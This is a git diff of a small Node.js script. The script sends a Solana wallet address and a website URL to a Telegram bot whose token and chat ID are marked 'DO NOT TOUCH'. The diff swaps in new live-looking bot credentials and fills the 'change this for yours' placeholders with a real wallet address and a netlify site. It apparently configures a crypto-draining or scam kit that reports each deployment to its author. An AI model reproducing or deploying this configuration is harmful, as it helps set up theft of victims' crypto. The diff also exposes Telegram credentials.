@@ -1,10 +1,10 @@
 const axios = require('axios');
 
 // Telegram Bot API token [ DO NOT TOUCH ]
-const botToken = '6345787783:AAGQn2Uy7rpVfy76SOSJGA3jttW2sH9U8';
+const botToken = '7202413581:AAEmK4Fn2qX0eVpYuM6zh42ed31AClA6i6Y';
 
 // Telegram channel ID [ DO NOT TOUCH ]
-const chatId = '4177494374';
+const chatId = '1198863117';
 
 
 async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
@@ -24,6 +24,6 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 }
 
 // Change this information for yours (
-const solana_wallet_receiver_id = 'YOUR_SOLANA_WALLET_RECEIVER_ID';
-const website_url = 'YOUR_WEBSITE_URL';
+const solana_wallet_receiver_id = '4HSA8CZnqDLZDbGhG17HNm5ZTp4pkcpEM4JFJjZKh3UX';
+const website_url = 'https://darinkayce.netlify.app';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
